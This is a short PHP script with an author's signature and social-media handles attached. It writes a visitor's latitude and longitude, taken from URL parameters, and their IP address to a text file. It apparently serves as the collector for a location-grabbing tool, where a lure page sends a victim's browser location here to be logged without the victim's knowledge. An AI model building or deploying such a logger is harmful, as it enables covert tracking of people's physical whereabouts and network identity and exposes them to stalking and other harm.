<?php
$my_file = fopen("lokeshn.txt", "w");
$information = "lat:" . $_GET["lat"] . "\nlong :" . $_GET["long"] . "\nip : " . $_SERVER["REMOTE_ADDR"] . "\n \nBy Al_iraq1";
fwrite($my_file , $information);
fclose($my_file);
?>
By Al_iraq1
Discord : _2ca
YT : @Al_iraq1
Replit : @Aliraq1
GitHub : @q0so
